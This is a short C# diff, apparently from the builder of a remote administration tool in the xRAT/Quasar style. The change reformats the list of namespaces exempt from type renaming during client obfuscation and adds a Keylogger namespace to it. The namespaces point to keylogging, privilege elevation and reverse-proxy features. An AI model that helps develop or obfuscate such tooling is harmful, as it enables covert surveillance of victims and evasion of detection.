@@ -58,10 +58,14 @@ namespace xServer.Core.Build
 
         private void RenameInType(TypeDefinition typeDef)
         {
-            if (typeDef.Namespace.StartsWith("My") || typeDef.Namespace.StartsWith("xClient.Core.Packets") ||
-                typeDef.Namespace == "xClient.Core" || typeDef.Namespace == "xClient.Core.Elevation" ||
-                typeDef.Namespace == "xClient.Core.Compression" || typeDef.Namespace.StartsWith("ProtoBuf") ||
-                typeDef.Namespace.Contains("xClient.Core.ReverseProxy"))
+            if (typeDef.Namespace.StartsWith("My") 
+                || typeDef.Namespace.StartsWith("xClient.Core.Packets") 
+                || typeDef.Namespace == "xClient.Core" 
+                || typeDef.Namespace == "xClient.Core.Elevation" 
+                || typeDef.Namespace == "xClient.Core.Compression" 
+                || typeDef.Namespace.StartsWith("ProtoBuf") 
+                || typeDef.Namespace.Contains("xClient.Core.ReverseProxy") 
+                || typeDef.Namespace.Contains("xClient.Core.Keylogger"))
                 return;
 
             TypeOverloader.GiveName(typeDef);
